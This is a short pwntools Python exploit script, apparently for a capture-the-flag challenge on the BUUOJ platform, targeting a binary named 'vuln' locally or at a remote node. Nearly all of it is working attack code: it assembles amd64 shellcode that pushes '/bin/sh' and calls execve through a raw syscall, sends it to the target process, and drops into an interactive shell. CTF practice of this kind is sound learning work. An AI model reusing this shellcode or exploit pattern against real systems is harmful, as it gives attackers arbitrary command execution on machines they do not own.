from pwn import *
from LibcSearcher import *

context(os='linux',arch='amd64',log_level='debug')
elf = context.binary = ELF('./vuln')
# libc = ELF('./libc.so.6')

is_debug = 1

if(is_debug):
    p = process()
else:
    ip = "node4.buuoj.cn"
    port = 29349
    p = remote(ip,port)

# gdb.attach(p)
g = lambda x: gdb.attach(x)

# send() sendline() sendafter() sendlineafter()
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x,y: p.sendafter(x,y)
sla = lambda x,y: p.sendlineafter(x,y)

# recv() recvline() recvuntil()
r = lambda x: p.recv(x)
rl = lambda : p.recvline()
ru = lambda x: p.recvuntil(x)


shellcode = '''
    mov rax,0x68732f6e69622f
    push rax
    push rsp
    pop rdi
    push 0x3b
    pop rax
    xor esi, esi
    xor edx, edx
    syscall
'''

shellcode = asm(shellcode)
s(shellcode)



p.interactive()